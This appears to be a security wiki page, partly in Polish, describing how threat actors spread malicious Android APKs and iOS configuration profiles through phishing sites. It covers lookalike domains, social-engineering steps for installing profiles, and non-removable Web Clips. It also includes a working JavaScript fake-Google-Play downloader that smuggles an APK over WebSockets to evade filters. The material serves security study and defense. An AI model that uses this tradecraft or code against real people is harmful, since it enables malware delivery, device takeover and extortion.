# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki używane przez threat actors do dystrybucji **malicious Android APKs** i **iOS mobile-configuration profiles** przez phishing (SEO, social engineering, fake stores, dating apps, etc.).
> Materiał jest zaadaptowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki domen podobnych do oryginałów (dating, cloud share, car service…).
– Używaj lokalnych słów kluczowych i emoji w elemencie `<title>`, aby rankować w Google.
– Hostuj *zarówno* Android (`.apk`), jak i iOS instrukcje instalacji na tej samej stronie docelowej.
2. **First Stage Download**
* Android: bezpośredni link do *unsigned* lub “third-party store” APK.
* iOS: `itms-services://` lub zwykły link HTTPS do malicious **mobileconfig** profile (see below).
3. **Android Post-install Behaviour**
* Wykonanie gated przez C2, nadużywanie uprawnień, dropper bypasses, zbieranie w tle i inne zachowania malware po instalacji są opisane na dedykowanej stronie Android Malware Post-Exploitation poniżej.
4. **iOS Delivery Technique**
* Pojedynczy **mobile-configuration profile** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd., aby zarejestrować urządzenie w nadzorze podobnym do “MDM”.
* Instrukcje social-engineering:
1. Otwórz Settings ➜ *Profile downloaded*.
2. Dotknij *Install* trzy razy (zrzuty ekranu na stronie phishingowej).
3. Zaufaj unsigned profile ➜ attacker zyskuje uprawnienia *Contacts* i *Photo* bez App Store review.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads mogą **przypiąć phishing URL do Home Screen** z brandingową ikoną/etykietą.
* Web Clips mogą działać w trybie **full-screen** (ukrywa interfejs browsera) i mogą być oznaczone jako **non-removable**, zmuszając ofiarę do usunięcia profile, aby usunąć ikonę.
6. **Network Layer**
* Zwykły HTTP, często na porcie 80 z HOST header jak `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwo wykryć).

## Android Malware Post-Exploitation

Aby zobaczyć post-install Android malware tradecraft, takie jak C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS i persistence, zobacz:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Dlaczego omija proste kontrole:
- Żaden statyczny URL APK nie jest ujawniany; payload jest odtwarzany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń, które blokują bezpośrednie odpowiedzi .apk, mogą nie wykryć danych binarnych tunelowanych przez WebSockets/Socket.IO.
- Crawlers i sandboxes URL, które nie wykonują WebSockets, nie pobiorą payload.

Zobacz też WebSocket tradecraft i tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
